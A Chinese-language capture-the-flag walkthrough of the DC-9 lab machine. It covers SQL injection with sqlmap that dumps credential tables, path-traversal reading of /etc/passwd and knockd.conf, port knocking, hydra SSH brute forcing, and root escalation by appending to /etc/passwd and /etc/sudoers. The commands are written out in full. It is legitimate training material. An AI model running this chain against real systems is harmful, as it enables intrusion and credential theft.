## DC-9靶机

### 信息收集

#### 主机扫描

开启靶机，ping一下存活主机

```shell
┌──(root㉿kali)-[/home/kali]
└─# nmap -sP 192.168.238.0/24
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-01 02:48 EST
Nmap scan report for bogon (192.168.238.52)
Host is up (0.0012s latency).
MAC Address: 08:00:27:7C:B1:D8 (Oracle VirtualBox virtual NIC)
```

靶机ip`192.168.238.52`

#### 端口扫描

```shell
nmap -A 192.168.238.52
PORT   STATE    SERVICE VERSION
22/tcp filtered ssh
80/tcp open     http    Apache httpd 2.4.38 ((Debian))
```

发现22端口是被过滤状态，不确定是否开启

#### 目录扫描

接着扫描一下目录，没有什么信息

```
dirsearch -u http://192.168.238.52/
```

### 漏洞发现和利用

打开web页面，用万能密码发现可以返回所有信息，判断有sql注入点

![image-20240301155800131](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240301155800131.png)

bp抓包，发现是`search`参数，直接用sqlmap跑

```
sqlmap -u http://192.168.238.52/results.php --data "search=1"
```

查看数据库

```
sqlmap -u http://192.168.238.52/results.php --data "search=1" --dbs
available databases [3]:
[*] information_schema
[*] Staff
[*] users
```

先看一下users库

```shell
sqlmap -u http://192.168.238.52/results.php --data "search=1" -D users --tables
sqlmap -u http://192.168.238.52/results.php --data "search=1" -D users -T UserDetails --columns
sqlmap -u http://192.168.238.52/results.php --data "search=1" -D users -T UserDetails -C username,password --dump
```

得到了一些用户名和密码，保存到users.txt

```
| marym     | 3kfs86sfd     |
| julied    | 468sfdfsd2    |
| fredf     | 4sfd87sfd1    |
| barneyr   | RocksOff      |
| tomc      | TC&TheBoyz    |
| jerrym    | B8m#48sd      |
| wilmaf    | Pebbles       |
| bettyr    | BamBam01      |
| chandlerb | UrAG0D!       |
| joeyt     | Passw0rd      |
| rachelg   | yN72#dsd      |
| rossg     | ILoveRachel   |
| monicag   | 3248dsds7s    |
| phoebeb   | smellycats    |
| scoots    | YR3BVxxxw87   |
| janitor   | Ilovepeepee   |
| janitor2  | Hawaii-Five-0 |
```

将用户名和密码，分别保存到两个文件中

```shell
cat users.txt | awk -F'[| ]+' '{print $2}' > user.txt
cat users.txt | awk -F'[| ]+' '{print $3}' > pass.txt
```

接着再去看Staff库

```shell
sqlmap -u http://192.168.238.52/results.php --data "search=1" -D Staff --tables
sqlmap -u http://192.168.238.52/results.php --data "search=1" -D Staff -T Users --columns
sqlmap -u http://192.168.238.52/results.php --data "search=1" -D Staff -T Users -C Username,Password --dump
```

#### 登录后台

得到了用户名，密码，这个看着像后台的登录账号

```shell
+----------+----------------------------------+
| Username | Password                         |
+----------+----------------------------------+
| admin    | 856f5de590ef37314e7c3bdf6f8a66dc |
+----------+----------------------------------+
```

密码进行md5解密得到，

`transorbital1`

尝试登录后台

![image-20240301161400204](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240301161400204.png)

#### 文件包含

发现页面下面提示文件不存在，猜测可能有文件包含漏洞

盲猜`?file=`

![image-20240301161743562](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240301161743562.png)

可以尝试多加几个../在前面

成功包含出passwd文件

![image-20240301161904286](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240301161904286.png)

发现这里的用户名和我们从数据库users得到的用户名，有一样的，可以进行ssh爆破

但22端口是过滤状态，猜测可能有knockd服务，读取一下knockd的配置文件

`?file=../../../../etc/knockd.conf`

```shell
[options]
	UseSyslog

[openSSH]
	sequence    = 7469,8475,9842 # 这里我们需要访问这三个端口，才能开启ssh
	seq_timeout = 25
	command     = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
	tcpflags    = syn

[closeSSH]
	sequence    = 9842,8475,7469 # 同样，要关闭ssh，需要返回这三个端口(就是上面端口的反序)
	seq_timeout = 25
	command     = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
	tcpflags    = syn
```

#### SSH端口敲门

在kali中我们可以使用knockd命令进行访问端口

```
knock 192.168.238.52 7469 8475 9842
```

也可以使用nc命令访问

```shell
nc 192.168.238.52 7469
nc 192.168.238.52 8475
nc 192.168.238.52 9842
```

这样22端口就open了

![image-20240301163033497](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240301163033497.png)

#### 爆破SSH账户

接着就开始爆破ssh

```
hydra -L user.txt -P pass.txt ssh://192.168.238.52
```

```shell
[22][ssh] host: 192.168.238.52   login: chandlerb   password: UrAG0D!
[22][ssh] host: 192.168.238.52   login: joeyt   password: Passw0rd
[22][ssh] host: 192.168.238.52   login: janitor   password: Ilovepeepee
```

这里前两个用户里都没有东西，我就直接登第三个账号

```shell
ssh janitor@192.168.238.52
```

```shell
janitor@dc-9:~$ ls -al
total 16
drwx------  4 janitor janitor 4096 Mar  1 18:34 .
drwxr-xr-x 19 root    root    4096 Dec 29  2019 ..
lrwxrwxrwx  1 janitor janitor    9 Dec 29  2019 .bash_history -> /dev/null
drwx------  3 janitor janitor 4096 Mar  1 18:34 .gnupg
drwx------  2 janitor janitor 4096 Dec 29  2019 .secrets-for-putin
janitor@dc-9:~$ cd .secrets-for-putin/
janitor@dc-9:~/.secrets-for-putin$ ls -al
total 12
drwx------ 2 janitor janitor 4096 Dec 29  2019 .
drwx------ 4 janitor janitor 4096 Mar  1 18:34 ..
-rwx------ 1 janitor janitor   66 Dec 29  2019 passwords-found-on-post-it-notes.txt
janitor@dc-9:~/.secrets-for-putin$ cat passwords-found-on-post-it-notes.txt
BamBam01
Passw0rd
smellycats
P0Lic#10-4
B4-Tru3-001
4uGU5T-NiGHts
```

又发现了一些密码，复制到pass.txt，再次爆破看看，命令同上

发现了一个新的用户

```
[22][ssh] host: 192.168.238.52   login: fredf   password: B4-Tru3-001
```

![image-20240301164349150](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240301164349150.png)

```shell
fredf@dc-9:~$ sudo -l
Matching Defaults entries for fredf on dc-9:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User fredf may run the following commands on dc-9:
    (root) NOPASSWD: /opt/devstuff/dist/test/test
```

发现有一个test文件

在上上级有test.py文件

```bash
fredf@dc-9:/opt/devstuff$ ls
build  dist  __pycache__  test.py  test.spec
```

内容

```python
#!/usr/bin/python

import sys

if len (sys.argv) != 3 : # 参数个数
    print ("Usage: python test.py read append")
    sys.exit (1)

else :
    f = open(sys.argv[1], "r") # argv[1]就是第一个参数
    output = (f.read())

    f = open(sys.argv[2], "a") # argv[2]就是第二个参数
    f.write(output)
    f.close()
```

argv[0]就是脚本自己

### 提权

我们可以创建一个用户，再将用户写进passwd文件

root的passwd格式

```
passwd的格式： [⽤户名]：[密码]：[UID]：[GID]：[⾝份描述]：[主⽬录]：[登录shell]
```

```
root:x:0:0:root:/root:/bin/bash
```

用openssl生成hash密码

```
openssl passwd -1 -salt co 123456
```

> 该命令是使用 OpenSSL 工具生成一个密码的哈希值。
>
> openssl：是一个开源的加密工具集，提供了多种密码学功能。
> passwd：是 OpenSSL 工具集中的一个子命令，用于生成密码的哈希值。
> -1：这是一个选项，表示使用的是 MD5 哈希算法。MD5 为过时的哈希算法，不推荐在生产环境中使用。
> -salt co：这也是一个选项，指定了加盐的字符串。盐（salt）是为了增加密码哈希的复杂度和安全性而添加的随机字符串。这里的盐是"co"。
>
> -salt：产生一个随机数，并与-k指定的password串联，然后计算其Hash值来防御字典攻击和rainbow table攻击。
>
> 123456：这是要进行哈希的原始密码。

根据passwd格式，写出

```
co:$1$co$5eSY9siNSJ4oyan/wF6j50:0:0::/root:/bin/bash
```

写进/tmp/1

```bash
fredf@dc-9:/opt/devstuff$ cat /tmp/1
co:$1$co$5eSY9siNSJ4oyan/wF6j50:0:0::/root:/bin/bash
```

利用test文件追加到passwd文件

```bash
fredf@dc-9:/opt/devstuff$ sudo /opt/devstuff/dist/test/test /tmp/1 /etc/passwd
fredf@dc-9:/opt/devstuff$ su - co
Password:
root@dc-9:~# ls
theflag.txt
```

另一种提权方式，利用/etc/sudoers文件，同样可以

> 授权文件(sudoers)
> 用途原理
>
> sudo是给普通的用户使用让其可以执行特权命令，普通用户使用之前需要先配置授权文件。
> sudo命令的运行，需经历如下几步：
> 运行 sudo 命令，会先通过 /etc/sudoers 文件，验证该用户是否有运行 sudo 的权限；
> 确定用户具有使用 sudo 命令的权限后，用户输入自己的密码进行确认。
> 密码输入成功后，会执行 sudo 命令后面的命令。

查看kali的sudoers文件,它是这样的格式

`root    ALL=(ALL:ALL) ALL`

构造当前用户的命令

```
fredf    ALL=(ALL:ALL) ALL
```

```bash
fredf@dc-9:~$ cat /tmp/2
fredf    ALL=(ALL:ALL) ALL
fredf@dc-9:~$ sudo /opt/devstuff/dist/test/test /tmp/2 /etc/sudoers
fredf@dc-9:~$ sudo su -
[sudo] password for fredf:
root@dc-9:~# ls
theflag.txt
```

### 总结

> 这是我的第一个靶机，基本流程还不太熟练
>
> 不知道/etc下的许多配置文件，得学习学习
>
> 这个靶机的一些知识点：
>
> sql注入点，knockd服务，文件包含，passwd文件提权，sudoers文件提权，openssl命令的使用
>
> `su -`切换用户，并切换环境变量
>
> `sudo su -`当前用户提权

